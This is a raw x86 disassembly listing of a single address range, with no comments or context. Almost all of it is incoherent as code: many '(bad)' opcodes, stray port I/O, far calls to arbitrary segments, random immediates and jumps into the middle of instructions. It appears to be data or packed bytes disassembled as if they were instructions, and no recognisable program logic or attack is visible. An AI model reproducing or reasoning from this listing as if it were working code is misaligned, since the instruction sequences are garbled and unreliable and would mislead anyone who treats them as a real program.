  41914c:	sub    cl,BYTE PTR [edx-0x1a471506]
  419152:	adc    esi,DWORD PTR [ebx-0x11beaff4]
  419158:	sbb    dh,BYTE PTR [esi+0x7bd7bbaf]
  41915e:	ss inc ebx
  419160:	dec    esi
  419161:	ret    0x489a
  419164:	xor    dh,dh
  419166:	sub    BYTE PTR [ebp+0xe],0xd1
  41916a:	in     eax,dx
  41916b:	sahf   
  41916c:	adc    edi,edx
  41916e:	jmp    0x4191c4
  419170:	ds (bad) 
  419172:	jo     0x4190fa
  419174:	xor    DWORD PTR [edi],ebx
  419176:	mov    esi,0xbfff7be
  41917b:	mov    eax,0x112bdd74
  419180:	lea    esp,[ebp-0x1d5dee31]
  419186:	inc    edx
  419187:	xor    eax,0x95940fa7
  41918c:	inc    ebx
  41918d:	xchg   edi,eax
  41918e:	xchg   ecx,eax
  41918f:	cwde   
  419190:	enter  0xa805,0xf3
  419194:	and    ch,dh
  419196:	push   ebx
  419197:	jmp    0x1c3ea2a8
  41919c:	sub    al,0x55
  41919e:	fs pop esi
  4191a0:	jg     0x4191b7
  4191a2:	inc    esi
  4191a3:	xchg   DWORD PTR [ebp+0x7b],ebx
  4191a6:	inc    ebx
  4191a7:	mov    ch,0x64
  4191a9:	dec    edx
  4191aa:	xchg   BYTE PTR [eax-0x6cc02a87],ch
  4191b0:	or     edx,ebp
  4191b2:	mov    esi,0x6f6d5745
  4191b7:	int    0x6
  4191b9:	push   es
  4191ba:	ror    DWORD PTR [edi+0x6690ec49],0xc9
  4191c1:	fstp   QWORD PTR [ecx]
  4191c3:	es inc ecx
  4191c5:	std    
  4191c6:	and    dh,dh
  4191c8:	adc    eax,0xb3030cad
  4191cd:	shr    BYTE PTR [eax-0x24],0x59
  4191d1:	xor    ebp,DWORD PTR [eax-0x6f]
  4191d4:	adc    DWORD PTR [ebp+0x53],eax
  4191d7:	sbb    eax,0x14564e42
  4191dc:	push   0xffffffc6
  4191de:	(bad)  
  4191df:	ss lock push 0x11
  4191e3:	fs jnp 0x4191e4
  4191e6:	test   BYTE PTR [eax+0x699c3193],dl
  4191ec:	jbe    0x419256
  4191ee:	mov    ah,0xef
  4191f0:	xor    al,BYTE PTR [eax]
  4191f2:	pop    edx
  4191f3:	sbb    eax,0x6ff2698
  4191f8:	es in  eax,0x38
  4191fb:	ret    
  4191fc:	lock or ebx,DWORD PTR [eax+0x1a5bd008]
  419203:	inc    ebp
  419204:	jecxz  0x419191
  419206:	je     0x41919f
  419208:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419209:	repnz and eax,0x27301a6b
  41920f:	xchg   edx,eax
  419210:	inc    esp
  419211:	dec    esp
  419212:	aaa    
  419213:	addr16 inc edx
  419215:	xchg   edi,eax
  419216:	xchg   esp,eax
  419217:	les    esp,FWORD PTR [edx+0x1d]
  41921a:	jp     0x4191f3
  41921c:	add    al,0xf3
  41921e:	or     esp,DWORD PTR [ebx+0x29]
  419221:	lahf   
  419222:	ins    BYTE PTR es:[edi],dx
  419223:	adc    eax,0xc9542a2
  419228:	ds out dx,al
  41922a:	jl     0x41928b
  41922c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41922d:	xchg   ebx,eax
  41922e:	xchg   ecx,eax
  41922f:	fsubr  st,st(2)
  419231:	dec    ecx
  419232:	or     al,0x30
  419234:	adc    DWORD PTR [ebp+0x20],edi
  419237:	sub    edx,esi
  419239:	imul   ecx,DWORD PTR [ebx+0x295d8659],0xa1aaa2e5
  419243:	lds    ebx,FWORD PTR [esi-0x1e]
  419246:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419247:	popf   
  419248:	dec    ecx
  419249:	jne    0x419291
  41924b:	pop    ebx
  41924c:	mov    gs,WORD PTR [ebx-0x6f]
  41924f:	cmp    DWORD PTR [ebx+0x23fb1bd7],0xfffffffe
  419256:	mov    edx,DWORD PTR [ecx]
  419258:	inc    eax
  419259:	and    eax,eax
  41925b:	sub    BYTE PTR ss:[ebx+ebp*2-0x5f],bh
  419260:	or     BYTE PTR ds:0xbba359fe,dl
  419266:	sub    bl,BYTE PTR [ebx]
  419268:	adc    al,BYTE PTR [esi]
  41926a:	and    eax,0x768e879b
  41926f:	sub    al,0x7f
  419271:	inc    edi
  419272:	mov    ebp,0x3e5a3750
  419277:	mov    esi,0x8aed7b0a
  41927c:	mov    cl,0xb1
  41927e:	stos   DWORD PTR es:[edi],eax
  41927f:	jmp    0x50562434
  419284:	(bad)  
  419285:	cmp    edi,DWORD PTR [ecx]
  419287:	repnz or BYTE PTR [ecx],al
  41928a:	sahf   
  41928b:	retfw  
  41928d:	mov    WORD PTR [edi+0x7c70393e],ds
  419293:	dec    esi
  419294:	out    0xb,al
  419296:	pop    esp
  419297:	and    ah,BYTE PTR [ebx]
  419299:	imul   esp,DWORD PTR [eax+0x2b],0x7a0022b1
  4192a0:	lods   eax,DWORD PTR ds:[esi]
  4192a1:	pop    ebp
  4192a2:	mov    ds:0xd8859fc,eax
  4192a7:	dec    ebp
  4192a8:	mov    al,ds:0xcb2c6551
  4192ad:	xor    BYTE PTR [edi-0x55],0x35
  4192b1:	jae    0x419329
  4192b3:	mov    cl,0x1f
  4192b5:	xor    eax,0x3cd5ae3a
  4192ba:	xchg   DWORD PTR ss:[edx+edx*4+0x9],esp
  4192bf:	jl     0x41928d
  4192c1:	(bad)  
  4192c2:	mov    esp,0x54e4c010
  4192c7:	dec    edx
  4192c8:	(bad)  
  4192ca:	adc    esi,ebp
  4192cc:	pop    ebx
  4192cd:	and    edi,DWORD PTR [edx]
  4192cf:	in     eax,dx
  4192d0:	pop    eax
  4192d1:	or     al,0x62
  4192d3:	sbb    ah,bh
  4192d5:	in     al,dx
  4192d6:	push   cs
  4192d7:	add    ch,bl
  4192d9:	push   0xffffffb5
  4192db:	mov    al,0xf0
  4192dd:	pop    ds
  4192de:	jnp    0x419276
  4192e0:	mov    ebx,0x1db7e03b
  4192e5:	sub    DWORD PTR [ebp+0x685fb3d7],eax
  4192eb:	cmc    
  4192ec:	imul   esi,DWORD PTR [edi],0x9673cd0d
  4192f2:	push   0x3d1535e0
  4192f7:	cmp    al,0x1b
  4192f9:	and    DWORD PTR [ebx+0x37c658d1],0x67645cf8
  419303:	test   al,0xb9
  419305:	sub    BYTE PTR [eax-0x52],ah
  419308:	pop    ebp
  419309:	mov    cs,WORD PTR [ebx]
  41930b:	sub    DWORD PTR ds:0xdbfc3408,ebp
  419311:	xchg   esi,eax
  419312:	mov    ah,0xea
  419314:	jg     0x419334
  419316:	scas   al,BYTE PTR es:[edi]
  419317:	(bad)  
  419319:	shl    BYTE PTR [ebx],cl
  41931b:	adc    ebp,DWORD PTR [eax-0x6e]
  41931e:	mov    dh,0x4
  419320:	or     esi,DWORD PTR [eax-0x60647289]
  419326:	sub    al,0xfd
  419328:	cli    
  419329:	bound  edx,QWORD PTR [ebx]
  41932b:	inc    DWORD PTR [ebx]
  41932d:	xchg   esi,eax
  41932e:	js     0x419342
  419330:	push   ss
  419331:	fs add eax,0x83ecabc8
  419337:	stos   DWORD PTR es:[edi],eax
  419338:	lods   al,BYTE PTR ds:[esi]
  419339:	adc    cl,BYTE PTR [eax]
  41933b:	stos   BYTE PTR es:[edi],al
  41933c:	adc    ah,BYTE PTR [eax-0x7b1671e0]
  419342:	ja     0x4192ec
  419344:	in     eax,0x51
  419346:	aad    0x4d
  419348:	jne    0x4192f1
  41934a:	xchg   ebx,eax
  41934b:	mov    edx,DWORD PTR [ecx]
  41934d:	adc    esp,edx
  41934f:	dec    ebp
  419350:	sub    bh,bh
  419352:	mov    ch,0x57
  419354:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419355:	push   cs
  419356:	push   ebx
  419357:	add    cl,BYTE PTR [eax]
  419359:	add    BYTE PTR [ebp-0x1093c9fd],0xb7
  419360:	mov    bh,0x3d
  419362:	call   0xd7c514f4
  419367:	adc    BYTE PTR [eax+0x57],al
  41936a:	mov    ch,0xbc
  41936c:	int3   
  41936d:	pop    ss
  41936e:	mov    esp,0xfb1b7cfd
  419373:	cmp    al,0xe2
  419375:	popa   
  419376:	jae    0x419397
  419378:	pop    edx
  419379:	jmp    0x3dfcfdf7
  41937e:	ret    
  41937f:	test   eax,0x1a45d6d8
  419384:	imul   eax,DWORD PTR [edi],0x61109828
  41938a:	dec    ecx
  41938b:	dec    edi
  41938c:	push   eax
  41938d:	mov    ds:0x3cb3f6e4,al
  419392:	add    al,0x85
  419394:	not    BYTE PTR [ebp+0x12]
  419397:	scas   eax,DWORD PTR es:[edi]
  419398:	aam    0xf3
  41939a:	pop    es
  41939b:	lock pushf 
  41939d:	fisttp DWORD PTR [eax+0x1e]
  4193a0:	cmp    edi,edx
  4193a2:	ins    DWORD PTR es:[edi],dx
  4193a3:	push   ds
  4193a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4193a5:	lds    esp,FWORD PTR [edi-0x260c39ab]
  4193ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4193ac:	(bad)  
  4193ad:	cli    
  4193ae:	and    bl,BYTE PTR [eax]
  4193b0:	sub    esi,DWORD PTR [ebx+0x60]
  4193b3:	adc    eax,0x83b3623
  4193b8:	xlat   BYTE PTR ds:[ebx]
  4193b9:	push   ebx
  4193ba:	iret   
  4193bb:	pop    ss
  4193bc:	push   ecx
  4193bd:	adc    eax,0x4cbd7d68
  4193c2:	das    
  4193c3:	popf   
  4193c4:	inc    esp
  4193c5:	dec    edx
  4193c6:	xchg   ebp,eax
  4193c7:	push   edx
  4193c8:	daa    
  4193c9:	mov    al,0x2a
  4193cb:	pop    edi
  4193cc:	dec    BYTE PTR [ebx-0x49]
  4193cf:	clc    
  4193d0:	add    eax,0xe30325aa
  4193d5:	xor    BYTE PTR [eax],bl
  4193d7:	int    0x3c
  4193d9:	pop    ss
  4193da:	inc    edx
  4193db:	and    ah,BYTE PTR [edi-0x2ff2beda]
  4193e1:	out    dx,al
  4193e2:	jb     0x41939d
  4193e4:	psllq  mm4,mm2
  4193e7:	cmp    al,0xa0
  4193e9:	mov    al,ds:0xe6ae224b
  4193ee:	pop    ebp
  4193ef:	rcr    DWORD PTR [ecx],cl
  4193f1:	push   ecx
  4193f2:	dec    ebp
  4193f3:	dec    edi
  4193f4:	test   ch,0xe4
  4193f7:	mov    DWORD PTR [edx],0xb7fe20a6
  4193fd:	mov    dh,0x2b
  4193ff:	xchg   esi,eax
  419400:	mov    ah,0xac
  419402:	mov    dl,bh
  419404:	ja     0x41946a
  419406:	call   0xaaf9:0x5305579d
  41940d:	jge    0x41948c
  41940f:	mov    ebx,0xb9f5bb96
  419414:	mov    eax,0x1a14ed8
  419419:	push   ss
  41941a:	call   FWORD PTR [esi-0x4a]
  41941d:	pop    es
  41941e:	and    DWORD PTR [edi],ecx
  419420:	dec    ecx
  419421:	push   eax
  419422:	aaa    
  419423:	xor    cl,bh
  419425:	adc    DWORD PTR [ebp-0x79],esi
  419428:	div    BYTE PTR [edi+0x69]
  41942b:	cmp    al,0x43
  41942d:	or     bh,BYTE PTR [esi+0x0]
  419430:	mov    fs,WORD PTR [ecx-0x78]
  419433:	sub    al,0x9b
  419435:	xlat   BYTE PTR ds:[ebx]
  419436:	inc    edi
  419437:	je     0x41946b
  419439:	dec    ebp
  41943a:	(bad)  
  41943c:	sub    BYTE PTR [edx+0x55],ah
  41943f:	mov    ebp,0x338e3966
  419444:	scas   eax,DWORD PTR es:[edi]
  419445:	mov    ch,0x12
  419447:	retf   
  419448:	add    eax,0x6db4c75
  41944d:	cmc    
  41944e:	sbb    ecx,0xffffff8d
  419451:	aam    0xdd
  419453:	nop
  419454:	ret    0x3b83
  419457:	arpl   WORD PTR [ebx+edx*8+0x46],bp
  41945b:	sub    edx,DWORD PTR [eax]
  41945d:	xor    ch,BYTE PTR [ebp+0x34]
  419460:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419461:	cld    
  419462:	scas   al,BYTE PTR es:[edi]
  419463:	jno    0x4194b3
  419465:	(bad)  [ebx+0x1702770a]
  41946b:	stc    
  41946c:	pop    ebx
  41946d:	mov    WORD PTR [ecx-0xf0876ae],ss
  419473:	lahf   
  419474:	jmp    0xca80:0x9ca04ac8
  41947b:	popa   
  41947c:	outs   dx,BYTE PTR ds:[esi]
  41947d:	or     al,BYTE PTR [edi-0x4c]
  419480:	push   edi
  419481:	cmc    
  419482:	jo     0x41948c
  419484:	call   0xde9dfb0d
  419489:	imul   ebp,DWORD PTR [eax],0x17
  41948c:	mov    ch,0x75
  41948e:	cmp    eax,0x78fd188a
  419493:	out    0xc3,eax
  419495:	add    eax,ecx
  419497:	and    dl,ch
  419499:	mov    eax,0x54ebf649
  41949e:	pushf  
  41949f:	(bad)  
  4194a1:	jmp    0x8bc502a2
  4194a6:	retf   0x1ac
  4194a9:	dec    edx
  4194aa:	(bad)  
  4194ab:	push   ecx
  4194ac:	cmp    eax,0xe9bdca15
  4194b1:	mov    ah,0x77
  4194b3:	xor    cl,BYTE PTR [edi]
  4194b5:	clc    
  4194b6:	test   DWORD PTR [ebp+0x2f],esi
  4194b9:	(bad)  
  4194ba:	push   edi
  4194bb:	mov    ds:0x6508bda1,eax
  4194c0:	icebp  
  4194c1:	xor    ch,bl
  4194c3:	or     ah,cl
  4194c5:	aam    0xb7
  4194c7:	cmp    BYTE PTR [edx-0x2d],bl
  4194ca:	pop    edx
  4194cb:	inc    DWORD PTR [ebp-0x4f]
  4194ce:	mov    ebp,0x9ed9836
  4194d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4194d4:	ret    
  4194d5:	adc    ebx,DWORD PTR [ebx-0x39acc2fb]
  4194db:	loope  0x419493
  4194dd:	push   ds
  4194de:	(bad)  
  4194df:	jle    0x4194c0
  4194e1:	jl     0x41949b
  4194e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4194e4:	data16 xor bl,dl
  4194e7:	and    al,0x1
  4194e9:	leave  
  4194ea:	cmp    BYTE PTR [ebp-0x21],bl
  4194ed:	jp     0x41947b
  4194ef:	push   ds
  4194f0:	add    esp,edi
  4194f2:	add    al,0x64
  4194f4:	mov    BYTE PTR [eax+0x498c404e],ch
  4194fa:	pop    edi
  4194fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4194fc:	mov    ds:0xf1511b5e,al
  419502:	jecxz  0x41948a
  419504:	popf   
  419505:	out    dx,al
  419506:	mov    bh,0x12
  419508:	jo     0x419513
  41950a:	dec    esi
  41950b:	mov    dl,BYTE PTR [ebp+0x2df59178]
  419511:	adc    esp,ebp
  419513:	xchg   ebp,eax
  419514:	imul   DWORD PTR [ebx+0x6c44d8c0]
  41951a:	repnz cmp esp,DWORD PTR [edi-0x458cfe40]
  419521:	jbe    0x419575
  419523:	inc    ebp
  419524:	push   edi
  419525:	cmp    DWORD PTR [esi],ecx
  419527:	cdq    
  419528:	je     0x4194e6
  41952a:	fidivr WORD PTR [ebx+0x77]
  41952d:	inc    edi
  41952e:	in     al,0x13
  419530:	push   edi
  419531:	pop    es
  419532:	bswap  esi
  419534:	shl    cl,cl
  419536:	stos   DWORD PTR es:[edi],eax
  419537:	pop    edi
  419538:	push   ebx
  419539:	imul   ebx,DWORD PTR ds:0xa9b966f4,0x966af1a6
  419543:	ins    DWORD PTR es:[edi],dx
  419544:	cdq    
  419545:	mov    al,0x85
  419547:	ret    0x9378
  41954a:	adc    al,0xbf
  41954c:	retf   
  41954d:	cmp    al,0x91
  41954f:	adc    cl,BYTE PTR [eax+esi*2]
  419552:	mov    ds:0xac45467,eax
  419557:	jne    0x419500
  419559:	inc    ecx
  41955a:	jge    0x4195d0
  41955c:	xor    dh,BYTE PTR [eax+0x177cfadb]
  419562:	cwde   
  419563:	mov    ah,0x43
  419565:	adc    al,0x2d
  419567:	nop
  419568:	out    dx,al
  419569:	shl    DWORD PTR [edx-0x2e],1
  41956c:	sti    
  41956d:	pop    edi
  41956e:	ss aas 
  419570:	sub    eax,0x273d0957
  419575:	out    dx,al
  419576:	aaa    
  419577:	jmp    0x33593b80
  41957c:	scas   al,BYTE PTR es:[edi]
  41957d:	ret    0xdb9f
  419580:	in     al,0x18
  419582:	or     esp,edx
  419584:	int3   
  419585:	xor    bh,BYTE PTR ds:0x184bf68b
  41958b:	jbe    0x41950d
  41958d:	adc    DWORD PTR [edi],0xd546a39c
  419593:	mov    eax,0x9b19cba9
  419598:	sub    BYTE PTR [edi],ah
  41959a:	cdq    
  41959b:	push   esp
  41959c:	out    0x45,al
  41959e:	(bad)  
  4195a0:	xchg   esi,eax
  4195a1:	and    ah,al
  4195a3:	sbb    BYTE PTR [ecx-0x25],ah
  4195a6:	cmp    BYTE PTR [ebx-0x3479391d],0x38
  4195ad:	xchg   ebp,eax
  4195ae:	mul    ebp
  4195b0:	inc    DWORD PTR [edx]
  4195b2:	not    al
  4195b4:	mov    ds:0x6113197e,al
  4195b9:	js     0x419579
  4195bb:	retf   0x6243
  4195be:	out    0xa1,al
  4195c0:	ss mov ebx,0x328606ad
  4195c6:	xchg   cl,cl
  4195c8:	jne    0x419590
  4195ca:	xchg   BYTE PTR [edx+0x61],ch
  4195cd:	xchg   ebp,eax
  4195ce:	jbe    0x419614
  4195d0:	mov    ebp,0x61857315
  4195d5:	ret    0xf56e
  4195d8:	cmp    ebx,DWORD PTR [edx]
  4195da:	test   eax,0x821c0b2b
  4195df:	sub    al,0x60
  4195e1:	inc    ecx
  4195e2:	shrd   DWORD PTR [ecx-0x7055d727],ebx,cl
  4195e9:	xchg   ebp,eax
  4195ea:	mov    WORD PTR [edi+0x2d],es
  4195ed:	mov    cs,WORD PTR [ebx]
  4195ef:	leave  
  4195f0:	lahf   
  4195f1:	mov    bl,ch
  4195f3:	or     esp,DWORD PTR [bx+si-0x3b7]
  4195f8:	mov    ch,0xfd
  4195fa:	scas   eax,DWORD PTR es:[edi]
  4195fb:	cli    
  4195fc:	ja     0x419638
  4195fe:	popf   
  4195ff:	int    0x98
  419601:	xchg   ebx,eax
  419602:	pop    es
  419603:	lods   eax,DWORD PTR ds:[esi]
  419604:	into   
  419605:	inc    esp
  419606:	pop    esp
  419607:	and    al,dl
  419609:	arpl   WORD PTR [eax],bx
  41960b:	rcl    BYTE PTR [esi+0x1d],0x9a
  41960f:	imul   edi,edx,0x151d37b6
  419615:	loope  0x4195b9
  419617:	xchg   edx,eax
  419618:	out    dx,al
  419619:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41961a:	dec    ebx
  41961b:	or     eax,DWORD PTR [edx-0x41]
  41961e:	xchg   edx,eax
  41961f:	fldenv [edi-0x2696f690]
  419625:	addr16 mov ch,0x2c
  419628:	mov    eax,ds:0x8fb5b7fd
  41962d:	sbb    BYTE PTR [ecx+0x74fe61a5],ah
  419633:	in     al,0x2
  419635:	js     0x419691
  419637:	fimul  DWORD PTR [eax]
  419639:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41963a:	mov    esi,0x9f7c7217
  41963f:	stc    
  419640:	ds aam 0x1b
  419643:	pop    ds
  419644:	aaa    
  419645:	xlat   BYTE PTR ds:[ebx]
  419646:	fs (bad) 
  419648:	int    0xf7
  41964a:	pop    edi
  41964b:	rcl    BYTE PTR [ebp-0x35e55039],1
  419651:	inc    esi
  419652:	jne    0x4195f9
  419654:	retf   
  419655:	je     0x41a17f
  41965b:	push   DWORD PTR [ebp+0x20]
  41965e:	push   DWORD PTR [ebp+0x1c]
  419661:	push   DWORD PTR [ebp+0x18]
  419664:	jmp    0x419bee
  419669:	mov    cl,bh
  41966b:	push   eax
  41966c:	inc    ax
  41966e:	push   ds
  41966f:	sbb    al,bl
  419671:	add    bl,BYTE PTR [esi-0x13]
  419674:	mov    ah,0x5f
  419676:	imul   esp,DWORD PTR [eax+ebp*2],0xffffffea
  41967a:	inc    ebp
  41967b:	or     al,0x16
  41967d:	cmp    eax,0x32161604
  419682:	push   0xfde11eb1
  419687:	dec    edx
  419688:	mov    ch,0x23
  41968a:	retf   
  41968b:	jp     0x419708
  41968d:	mov    WORD PTR [esi],es
  41968f:	and    DWORD PTR [ebp-0x7f],edx
  419692:	imul   ebx,DWORD PTR [edx],0xfffffffd
  419695:	jo     0x4196d0
  419697:	and    bl,bl
  419699:	outs   dx,DWORD PTR ss:[esi]
  41969b:	enter  0x5231,0xaa
  41969f:	fidivr DWORD PTR [ebx-0x1dc4cb0]
  4196a5:	mov    ebx,0xdb69a909
  4196aa:	adc    DWORD PTR [ebx+0x5e246f5b],ebp
  4196b0:	ins    BYTE PTR es:[edi],dx
  4196b1:	push   ebx
  4196b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4196b3:	mov    bl,0xbe
  4196b5:	cdq    
  4196b6:	je     0x419704
  4196b8:	xchg   esi,eax
  4196b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4196ba:	pop    ebp
  4196bb:	arpl   bp,si
  4196bd:	jno    0x4196d8
  4196bf:	sbb    DWORD PTR [ecx+0x7c],0xfb354fa2
  4196c6:	inc    ebp
  4196c7:	aas    
  4196c8:	iret   
  4196c9:	fmul   st(5),st
  4196cb:	push   eax
  4196cc:	inc    esp
  4196cd:	stc    
  4196ce:	out    0x62,al
  4196d0:	mov    bl,0x1b
  4196d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4196d3:	or     DWORD PTR [edx-0x3a75a6bb],0x70
  4196da:	and    DWORD PTR [ecx],ebp
  4196dc:	loopne 0x41974a
  4196de:	pop    esi
  4196df:	pop    edx
  4196e0:	or     eax,0x71d44d18
  4196e5:	sbb    DWORD PTR [eax+0x20],0x38dd576b
  4196ec:	cdq    
  4196ed:	sbb    eax,0x4d3700f2
  4196f2:	enter  0xceca,0x4f
  4196f6:	mov    ah,al
  4196f8:	shl    DWORD PTR [edx-0x8],cl
  4196fb:	xchg   esp,eax
  4196fc:	fsubr  DWORD PTR [edi+0x7380c67c]
  419702:	fist   WORD PTR [ecx+eiz*2-0x60df0f8b]
  419709:	xlat   BYTE PTR ds:[ebx]
  41970a:	adc    al,0x1b
  41970c:	xor    ecx,DWORD PTR [ebx+0x26]
  41970f:	call   0x490:0xd5b8abd
  419716:	add    eax,0xb08ee2d3
  41971b:	jp     0x4196a4
  41971d:	(bad)  
  41971e:	cli    
  41971f:	lahf   
  419720:	mov    dh,0xac
  419722:	(bad)
  419726:	sub    eax,ecx
  419728:	and    BYTE PTR [ebx-0x1a05920a],ch
  41972e:	call   0x8a5d:0xe0489920
  419735:	push   cs
  419736:	jo     0x41971f
  419738:	test   bh,dh
  41973a:	in     eax,0x80
  41973c:	and    eax,DWORD PTR [ebx+0x53]
  41973f:	(bad)  
  419741:	jmp    0x41970b
  419743:	sbb    dh,BYTE PTR [ebp+0xb]
  419746:	sub    BYTE PTR [eax+ecx*8-0x50],0x26
  41974b:	cwde   
  41974c:	sub    al,0x8f
  41974e:	pop    edx
  41974f:	enter  0x442,0x18
  419753:	fiadd  DWORD PTR ds:0xe5f8607a
  419759:	das    
  41975a:	jge    0x419755
  41975c:	push   es
  41975d:	mov    esi,0xa9a38930
  419762:	xor    eax,edx
  419764:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419765:	iret   
  419766:	loopne 0x419703
  419768:	xor    cl,0x2f
  41976b:	sbb    BYTE PTR [ebp-0x14a899fa],ch
  419771:	or     al,0x73
  419773:	jb     0x4197ef
  419775:	loopne 0x4197ad
  419777:	rol    DWORD PTR [edx],cl
  419779:	je     0x419723
  41977b:	pop    ecx
  41977c:	add    DWORD PTR [ecx],0xffffff9c
  41977f:	inc    eax
  419780:	popa   
  419781:	xchg   esi,eax
  419782:	dec    ebp
  419783:	xor    ecx,edx
  419785:	adc    BYTE PTR [edi+0x4415c431],ah
  41978b:	into   
  41978c:	sbb    ebp,0xffffff9f
  41978f:	sbb    eax,0x8b0b455e
  419794:	jbe    0x41972a
  419796:	xchg   edx,ecx
  419798:	pop    ebx
  419799:	call   0x4941:0xc7f94cb9
  4197a0:	jnp    0x419790
  4197a2:	inc    edi
  4197a3:	outs   dx,DWORD PTR ds:[esi]
  4197a4:	push   esi
  4197a5:	pushf  
  4197a6:	call   0xdad3bef7
  4197ab:	mov    eax,ds:0x4223d5e6
  4197b0:	mov    dl,0xcb
  4197b2:	out    0xde,eax
  4197b4:	lds    ecx,FWORD PTR [edi+0x687eceea]
  4197ba:	in     al,0xbe
  4197bc:	cmp    eax,0xc753a4d0
  4197c1:	test   DWORD PTR [ebx+0x648f8a0c],0xa90f79f7
  4197cb:	and    esp,DWORD PTR [ecx+0x6ad22771]
  4197d1:	add    eax,0x58a7d73
  4197d6:	sub    edi,edx
  4197d8:	jmp    0xae63ee6a
  4197dd:	scas   eax,DWORD PTR es:[edi]
  4197de:	xchg   ebp,eax
  4197df:	xor    DWORD PTR [esi],0xedb71f14
  4197e5:	or     DWORD PTR [ebp-0xc],esi
  4197e8:	not    BYTE PTR [ecx+0x2725c0c0]
  4197ee:	aas    
  4197ef:	mov    ah,ah
  4197f1:	aas    
  4197f2:	(bad)  
  4197f3:	or     al,0x14
  4197f5:	nop
  4197f6:	cli    
  4197f7:	jmp    FWORD PTR [ecx]
  4197f9:	adc    esp,DWORD PTR [eax-0x14]
  4197fc:	addr16 push ds
  4197fe:	ins    BYTE PTR es:[edi],dx
  4197ff:	sub    bh,BYTE PTR ds:[esi+0x1e]
  419803:	test   al,0x50
  419805:	clc    
  419806:	xlat   BYTE PTR ds:[ebx]
  419807:	adc    dh,BYTE PTR [eax]
  419809:	mov    esi,0x6eb6cb0d
  41980e:	cs popf 
  419810:	rcl    BYTE PTR [esi+0x2b42ad4a],cl
  419816:	inc    eax
  419817:	mov    eax,ds:0x31ec1fc1
  41981c:	(bad)  
  41981d:	data16 repz and dh,BYTE PTR [edi-0x80]
  419822:	retfw  0xade3
  419826:	or     al,0x9
  419828:	int3   
  419829:	inc    ebx
  41982a:	fwait
  41982b:	stos   BYTE PTR es:[edi],al
  41982c:	ret    0x98e0
  41982f:	or     eax,0xc61f9244
  419834:	(bad)  
  419835:	fidivr WORD PTR [eax+0x47d429d2]
  41983b:	xchg   cl,ch
  41983d:	aad    0x5
  41983f:	sar    DWORD PTR [edi-0x6b],cl
  419842:	fcomp  DWORD PTR [esi]
  419844:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419845:	mov    edx,0x9f065fa1
  41984a:	jmp    0xfb12:0xbcaf944
  419851:	xor    eax,0x3e3dab75
  419856:	jecxz  0x419881
  419858:	pop    eax
  419859:	push   ds
  41985a:	cmp    esp,DWORD PTR [ebp*2-0x653d594d]
  419861:	jecxz  0x41983a
  419863:	sub    eax,0x282e02ab
  419868:	cs cwde 
  41986a:	sub    dh,BYTE PTR [ebx-0x2d]
  41986d:	fisttp QWORD PTR [eax]
  41986f:	ret    0xf21a
  419872:	mov    cl,0x88
  419874:	add    DWORD PTR [ebp-0x28],eax
  419877:	inc    esp
  419878:	sub    DWORD PTR [ebp+0x77],ecx
  41987b:	mov    ds:0xbcf8431a,al
  419880:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419881:	xor    edi,DWORD PTR [edi+ebx*8-0x4f]
  419885:	repz mov cl,0x5d
  419888:	shr    DWORD PTR [eax-0x5f],cl
  41988b:	or     al,0xb8
  41988d:	mov    dl,BYTE PTR [edi+0x74]
  419890:	ja     0x41987f
  419892:	dec    esi
  419893:	(bad)  
  419894:	push   ebp
  419895:	jb     0x4198ed
  419897:	push   0xffffffb8
  419899:	(bad)  
  41989a:	es aad 0x78
  41989d:	adc    al,0x8c
  41989f:	aas    
  4198a0:	js     0x4198f3
  4198a2:	adc    eax,0xedf57eee
  4198a7:	push   0x43
  4198a9:	inc    edx
  4198aa:	(bad)  
  4198ab:	cmp    eax,0x505babb3
  4198b0:	and    bl,dl
  4198b2:	loopne 0x4198d2
  4198b4:	or     ah,BYTE PTR [esi+0x124d6244]
  4198ba:	stos   DWORD PTR es:[edi],eax
  4198bb:	scas   eax,DWORD PTR es:[edi]
  4198bc:	jmp    0x2640d4ca
  4198c1:	call   0x8d93:0xeeb67894
  4198c8:	mov    dl,0x17
  4198ca:	push   cs
  4198cb:	or     BYTE PTR [ebx-0x3f],bl
  4198ce:	xchg   ecx,eax
  4198cf:	loopne 0x4198cc
  4198d1:	sbb    DWORD PTR [ecx-0x6561c9f],eax
  4198d7:	xchg   esp,eax
  4198d8:	xor    DWORD PTR [edi+0x51],edx
  4198db:	sbb    eax,edi
  4198dd:	jmp    0x1e52aafc
  4198e2:	sbb    edi,DWORD PTR ds:0xa77f53e3
  4198e8:	inc    esi
  4198e9:	shl    BYTE PTR [edx],cl
  4198eb:	data16 cmc 
  4198ed:	jbe    0x4198bc
  4198ef:	and    bh,BYTE PTR [eax+esi*1+0x7a]
  4198f3:	jg     0x419913
  4198f5:	je     0x4198d6
  4198f7:	ins    DWORD PTR es:[edi],dx
  4198f8:	shr    BYTE PTR [edi+0x7ee7c96b],cl
  4198fe:	stos   DWORD PTR es:[edi],eax
  4198ff:	push   ss
  419900:	inc    edi
  419901:	outs   dx,DWORD PTR ds:[esi]
  419902:	xor    BYTE PTR [eax],dh
  419904:	mov    ebx,0xa8953cd1
  419909:	out    0xe0,al
  41990b:	jp     0x41996e
  41990d:	lock jno 0x419901
  419910:	fimul  WORD PTR [edx-0x2c2cd773]
  419916:	and    DWORD PTR [eax-0x65],esp
  419919:	push   es
  41991a:	inc    esi
  41991b:	rcl    BYTE PTR [ebx+0x43],0xe2
  41991f:	push   cs
  419920:	stc    
  419921:	ret    
